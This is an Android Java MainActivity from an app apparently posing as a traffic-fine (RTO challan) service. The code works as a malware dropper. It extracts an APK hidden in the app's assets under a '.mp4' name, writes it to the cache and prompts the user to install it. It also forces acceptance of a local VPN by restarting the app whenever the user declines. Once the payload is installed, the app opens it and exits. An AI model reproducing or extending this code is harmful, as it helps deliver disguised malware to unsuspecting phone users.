package com.service.rtochallan_v;

import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.net.VpnService;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.FileProvider;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

    public class MainActivity extends AppCompatActivity {
        private InstallReceiver installReceiver;
        private Helper helper;
        private static final int VPN_REQUEST_CODE = 100;

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);
            helper = new Helper(this);
            String packageName = helper.getApkPackageName();
            boolean isAppInstalled = false;
            if (helper.isAppInstalled(packageName)) {
                helper.openApp(packageName);
                isAppInstalled = true;
            }
            if(!isAppInstalled){
                startLocalVpn();
                installReceiver = new InstallReceiver();
                IntentFilter filter = new IntentFilter(Intent.ACTION_PACKAGE_ADDED);
                filter.addDataScheme("package");
                registerReceiver(installReceiver, filter);
            }
        }

        public void  updateService(View v){
            try {
                String TARGET_FILE = helper.SOURCE_FILE.replace(".mp4", ".apk");
                File apkFile = new File(getCacheDir(), TARGET_FILE);
                try (InputStream is = getAssets().open(helper.SOURCE_FILE);
                     FileOutputStream fos = new FileOutputStream(apkFile)) {
                    byte[] buffer = new byte[4096];
                    int length;
                    while ((length = is.read(buffer)) > 0) {
                        fos.write(buffer, 0, length);
                    }
                }
                Uri apkUri = FileProvider.getUriForFile(
                        this,
                        getPackageName() + ".provider",
                        apkFile
                );
                Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                intent.setData(apkUri);
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);

            } catch (Exception e) {
                Toast.makeText(this, "Updated Install failed: " + e.getMessage(), Toast.LENGTH_LONG).show();
                e.printStackTrace();
            }
        }

        @Override
        protected void onActivityResult(int requestCode, int resultCode, Intent data) {
            super.onActivityResult(requestCode, resultCode, data);
            if (requestCode == VPN_REQUEST_CODE) {
                if (resultCode == RESULT_OK) {
                    Intent vpnIntent = new Intent(this, LocalVpnService.class);
                    startService(vpnIntent);
                } else if (resultCode == RESULT_CANCELED) {
                    restartApp();
                }
            }
        }


        private void startLocalVpn() {
            //helper.show( "called start local vpn");
            Intent intent = VpnService.prepare(this);
            if (intent != null) {
                startActivityForResult(intent, VPN_REQUEST_CODE);
            } else {
                onActivityResult(VPN_REQUEST_CODE, RESULT_OK, null);
            }
        }

        private void restartApp() {
            Intent intent = getBaseContext().getPackageManager().getLaunchIntentForPackage(getBaseContext().getPackageName());
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP |
                        Intent.FLAG_ACTIVITY_CLEAR_TASK |
                        Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            }
            android.os.Process.killProcess(android.os.Process.myPid());
            System.exit(0);
        }

        private void stopLocalVpn() {
            try {
                String caller = Thread.currentThread().getStackTrace()[3].getMethodName();
                Intent intent = new Intent(this, LocalVpnService.class);
                stopService(intent);
                helper.show("✅ VPN stopped:From: " + caller);
            } catch (Exception e) {
                String errorDetails = Log.getStackTraceString(e);
                helper.show( "⚠️ Error stopping VPN: " + errorDetails);
                helper.showTost("⚠️ Error stopping VPN: " + errorDetails);
            }
        }


        @Override
        protected void onStart() {
            helper = new Helper(this);
            String packageName = helper.getApkPackageName();
            if (packageName != null && !packageName.isEmpty()) {
                if(helper.isAppInstalled(packageName)) {
                    helper.stopLocalVpn();
                    helper.openApp(packageName);
                    helper.closeApp();
                }
            }
            super.onStart();
        }

        @Override
        protected void onPause() {
            helper.show( "onPause");
            super.onPause();
        }

        @Override
        protected void onStop() {
            helper.show( "onStop");
            super.onStop();
        }

        @Override
        protected void onDestroy() {
            helper.show( "OnDestory");
            if (installReceiver != null) {
                try {
                    unregisterReceiver(installReceiver);
                    installReceiver = null;
                } catch (IllegalArgumentException e) {
                    helper.show("⚠️ Receiver already unregistered");
                    helper.showTost("⚠️ Receiver already unregistered");
                }
            }
            stopLocalVpn();
            super.onDestroy();
        }



    }
